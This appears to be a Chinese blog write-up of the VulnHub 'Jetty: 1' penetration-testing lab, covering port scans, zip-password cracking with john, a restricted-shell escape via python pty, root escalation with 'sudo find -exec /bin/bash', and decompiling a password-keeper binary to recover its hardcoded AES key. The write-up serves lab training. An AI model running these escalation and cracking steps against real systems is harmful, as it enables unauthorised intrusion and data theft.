---
layout:  post    # 使用的布局（不需要改）
title:   VulnHub-Jetty 1 靶场渗透测试   # 标题 
subtitle:    #副标题
date:  2021-01-27  # 时间
author:  yanmie    # 作者
header-img: img/.jpg ##标签这篇文章标题背景图片
catalog: true      # 是否归档
tags:        
    - Vulnhub

---

靶机信息：

- **Name**: Jetty: 1
- **Date release**: 9 Dec 2020
- **download:**  https://www.vulnhub.com/entry/jetty-1,621/
- **描述：** Aquarium Life SL公司已与您联系，对他们的其中一台机器进行笔测试。他们怀疑他们的一名雇员一直在欺诈售卖假票。他们希望您闯入他的计算机，提升特权并搜索任何证明这种行为的证据。
  - 可疑用户名是squiddie。
  - 他负责水族馆的门票销售。
  - 机器的想法不仅是获得root特权，而且还获得所有证据来证明用户正在欺诈。

## 一、信息收集

#### 1.1 主机发现

 ```bash
nmap -sP 192.168.56.1/24
 ```

![image-20210126172801126](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126172801126.png)

#### 1.2 扫描端口

```bash
➜  ~ nmap -sT -T4 -sV -p- 192.168.56.105
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-26 17:28 CST
Nmap scan report for localhost (192.168.56.105)
Host is up (0.00088s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
65507/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
MAC Address: 08:00:27:02:95:F3 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.38 seconds
```

开放 21、80、65507 端口。

#### 1.3 端口服务信息收集

80 端口，打开网址只有一张图，扫描目录得到：

```
http://192.168.56.105/
```



![image-20210126174018670](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126174018670.png)

访问 `robots.txt`

```txt
User-agent: *
Disallow: /dir/
Disallow: /passwords/
Disallow: /facebook_photos
Disallow: /admin/secret
```

访问但是 not found.

尝试 21 端口 ftp,

```
ftp://192.168.56.105/
```

![image-20210126174459360](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126174459360.png)

README.TXT 内容：

```txt
Hi Henry, here you have your ssh's password. As you can see the file is encrypted with the default company's password. 
Please, once you have read this file, run the following command on your computer to close the FTP server on your side. 
IT IS VERY IMPORTANT!! CMD: service ftp stop. 

Regards, Michael.
```

下载压缩包有密码，kali爆破：

```bash
zip2john sshpass.zip >>password.txt
john password.txt --wordlist=/usr/share/wordlists/rockyou.txt
Jetty john password.txt --show

# 成功得到密码  seahorse!
➜  Jetty john password.txt --show
sshpass.zip/sshpass.txt:seahorse!:sshpass.txt:sshpass.zip::sshpass.zip

1 password hash cracked, 0 left
```

解压`unzip` ，得到

```
Squ1d4r3Th3B3$t0fTh3W0rLd
```

ssh 密码得到，尝试用户 `Jetty`登录失败，回到最开始的 `squiddie` 尝试成功：

```bash
ssh squiddie@192.168.56.105 -p 65507
```

## 二、漏洞发现

ssh 连接靶机后，发现有很多命令被禁止，输入几次就会被强制退出 ssh 连接。

尝试bash谈一个 shell回来,失败了，收到了限制。

```bash
squiddie:~$ ?
cd  clear  exit  help  history  lpath  ls  lsudo  pwd  python  whoami
```

发现目标有 python 环境并且不受限制。

python一句话弹升级交互式也失败，但是在python交互界面成功：

```python
>>> import pty
>>> pty.spawn("/bin/bash")
```

或者

```python
>>> import pty
>>> pty.spawn("/bin/bash")
```

![image-20210126200328538](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126200328538.png)

![image-20210126200447978](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126200447978.png)

成功突破限制。

## 三、提权

直接 `sudo -l`

![image-20210126201744737](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126201744737.png)

发现可以以 root 身份执行 find 命令.

**有时用户有权执行特定目录的任何文件或命令，如/bin/cp、/bin/cat或/usr/bin/find，这种类型的权限会导致root权限的权限提升。**

```
sudo find /home -exec /bin/bash \;
```

直接提权为 root .

完成小目标。但是描述说提权只是中等难度，拿到他的犯罪证据才是关键的。

## 四、取证

查看定时任务

![image-20210126202214746](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126202214746.png)

发现有定时任务。

查看它：

```bash
root@jetty:~# cat /etc/cron.daily/backup 
#!/bin/sh

#BACKUP FILES EVERY TWO MINUTES
rsync -raz /root/Documents/.docs /var/backups/
chmod 700 /var/backups/.docs
```

![image-20210126210700528](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126210700528.png)

目录下有很多表格，将其打包，然后开启 http服务(python2)

```bash
python -m SimpleHTTPServer 8000
```



![image-20210126210949592](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126210949592.png)

kali中下载

![image-20210126211103094](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126211103094.png)

成功下载，接下来解压

```bash
unzip doc.zip -d doc/
```

尝试打开文档，但是发现被加密了

![image-20210126211822248](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126211822248.png)

在`Password_keeper` 文件夹下发现，有个exe 文件，还有`database.txt` ，`usage.txt` ,相关联，不能发现是 exe 对表格进行的加密。

![image-20210126212000317](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126212000317.png)

base64解码是乱码。database.txt里面保存着密文，那么关键就是password_keeper.exe程序了。

![image-20210126212359537](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210126212359537.png)

运行软件发现， 1 功能可以查看密码，但是还需要密码验证。

从前面的usage里面和这个exe文件的图标可以知道它是pyinstaller打包的程序，

使用 `pyinstxtractor.py` 反编译。

[下载地址](https://sourceforge.net/projects/pyinstallerextractor/)

将pyinstxtractor.py文件和程序放在同一文件夹下，使用python pyinstxtractor.py password_keeper.exe命令，就会在同一目录下产生一个password_keeper.exe_extracted目录，

![image-20210127121146991](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210127121146991.png)

![image-20210127120856953](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210127120856953.png)

其中 `password_keeper` 就是我们所需要的 pyc 文件，增加后缀 `pyc` .

反编译网址:http://tools.bugscaner.com/decompyle/

但是直接编译会报错，

![image-20210127121957167](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210127121957167.png)

我们找到 `struct`,我们给他加上后缀`.pyc`反编译试试。发现成功反编译出如下内容：

![image-20210127122112274](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210127122112274.png)

成功编译，

是因为 `password_keeper.pyc` 缺少一些字节导致编译失败的。

![image-20210127122455380](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210127122455380.png)

缺少了7 字节，我们把它补上去，

![image-20210127122618983](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210127122618983.png)

再去反编译一下，成功编译：

```python
#! /usr/bin/env python 2.7 (62211)
#coding=utf-8
# Compiled at: 1995-09-27 11:18:56
#Powered by BugScaner
#http://tools.bugscaner.com/
#如果觉得不错,请分享给你朋友使用吧!
from Cryptodome.Cipher import AES
import base64
BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s: s[0:-ord(s[-1])]
 
def cipher_message(key, message, iv):
    message = pad(message)
    key = base64.b64decode(key)
    obj = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = obj.encrypt(message)
    ciphertext = base64.b64encode(ciphertext)
    return ciphertext
 
 
def decipher_message(key, ciphertext, iv):
    ciphertext = base64.b64decode(ciphertext)
    key = base64.b64decode(key)
    obj2 = AES.new(key, AES.MODE_CBC, iv)
    decipher_text = obj2.decrypt(ciphertext)
    decipher_text = unpad(decipher_text)
    return decipher_text
 
 
def generate_key(ciphertext, tag, key, iv):
    ciphertext = cipher_message(key, ciphertext, iv)
    print ''
    print "Now copy this into your database.txt (It's the free version... pay for an automated tool!)"
    print ''
    print 'Tag Password'
    print tag + ' ' + ciphertext
 
 
def show_keys(database, key, iv):
    check_permissions = raw_input('Insert password: ')
    if base64.b64encode(check_permissions) == key:
        for i in range(len(database[0])):
            ciphertext = database[1][i]
            decipher = decipher_message(key, ciphertext, iv)
            print ' '
            print 'Tag: ' + database[0][i] + ' Password: ' + decipher
            print ' '
 
    else:
        print ''
        print 'Tag: Instagram Password: WRONG '
        print 'Tag: Facebook  Password: PASSWORD '
        print 'Tag: SSH       Password: TRY '
        print 'Tag: root      Password: HARDER! '
        print ''
 
 
def read_database():
    database = [[], []]
    f = open('database.txt', 'r')
    for line in f.readlines():
        line = line.strip().split()
        database[0].append(line[0])
        database[1].append(line[1])
 
    f.close()
    return database
 
 
def main():
    print 'Welcome to the best password keeper ever!'
    print '__        __         _                _  __                         '
    print '\\ \\      / /__  __ _| | ___   _      | |/ /___  ___ _ __   ___ _ __ '
    print " \\ \\ /\\ / / _ \\/ _` | |/ / | | |_____| ' // _ \\/ _ \\ '_ \\ / _ \\ '__|"
    print '  \\ V  V /  __/ (_| |   <| |_| |_____| . \\  __/  __/ |_) |  __/ |   '
    print '   \\_/\\_/ \\___|\\__,_|_|\\_\\__,  |     |_|\\_\\___|\\___| .__/ \\___|_|   '
    print '                          |___/                    |_|   '
    iv = '166fe2294df5d0f3'
    key = 'N2FlMjE4ZmYyOTI4ZjZiMg=='
    database = read_database()
    loop = True
    while loop:
        print ''
        print 'Choose what you want to do: '
        print '1) See your passwords!'
        print '2) Generate a cipher-password'
        print '3) Close'
        option = raw_input('Insert your selection here --> ')
        if option == '1':
            print ''
            print 'Showing content of your secret passwords...'
            print ''
            show_keys(database, key, iv)
            print ''
            returned = raw_input('Press any button to return to the menu...')
        elif option == '2':
            print ''
            print ''
            title = raw_input('Type the name of the application: ')
            password = raw_input('Type the password(BEWARE OF SHOULDER SURFING!!!): ')
            generate_key(password, title, key, iv)
            print ''
            print ''
            returned = raw_input('Press any button to return to the menu...')
        else:
            if option == '3':
                loop = False
                print ''
                return 'Bye Byeeeeeeeeeeeee'
            print ''
            print ''
            print 'WHAT? FAILURE TO COMMUNICATE... Reseting connection...'
            print ''
            print ''
            returned = raw_input('Press any button to return to the menu...')
 
 
if __name__ == '__main__':
    print main()
```

我们输入 1 后执行函数 `show_keys` ,将我们输入的密码 base64 编码后与 `key` 进行比较，

`key = 'N2FlMjE4ZmYyOTI4ZjZiMg=='` ,将 key base64 解码得到`7ae218ff2928f6b2`,

```python
def show_keys(database, key, iv):
    check_permissions = raw_input('Insert password: ')
    if base64.b64encode(check_permissions) == key:
        for i in range(len(database[0])):
            ciphertext = database[1][i]
            decipher = decipher_message(key, ciphertext, iv)
            print ' '
            print 'Tag: ' + database[0][i] + ' Password: ' + decipher
            print ' '
```

![image-20210127123359814](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210127123359814.png)

得到密码，打开文件，

取证：

MoneyBalance.xlsx：C5Y0wzGqq4Xw8XGD，总共赚的钱，11月赚了140欧元

![image-20210127123945611](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210127123945611.png)

AccountabiltyReportMorning-1112018.xlsx：没有密码，因为这个是给老板看的修改过后的正常的账单

Accountabilty_not_cooked.xlsx：co8oiads13kt，未修改过的账单

Pending_to_erase.xlsx: 1hi2ChHrtkQsUTOc，准备消除证据的表格

参考文章：

https://www.cnblogs.com/backlion/p/10504003.html

https://zhuanlan.zhihu.com/p/109266820